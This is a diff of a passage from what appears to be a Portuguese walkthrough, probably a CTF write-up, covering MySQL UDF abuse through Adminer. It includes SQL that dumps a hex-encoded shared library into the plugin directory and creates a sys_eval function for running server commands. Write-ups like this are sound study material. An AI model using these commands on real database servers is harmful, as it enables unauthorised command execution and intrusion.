@@ -94,8 +94,8 @@ E rodando o SQL lá no Adminer:
 
 `select unhex('7f454c4601010100000000000000000...') into dumpfile '/usr/lib/mysql/plugin/sigsegv.so' from dual`
 
-Percebi que a query foi executada com sucesso! Agora então só bastava criar as UDF.
-Então executando:
+Percebi que a query foi executada com sucesso! Agora então só bastava criar uma UDF que executasse comando no servidor
+e retornasse o output. Então escolhi a `sys_eval` da lib, e criei executando:
 
 `CREATE FUNCTION sys_eval RETURNS string SONAME 'sigsegv.so';`
 
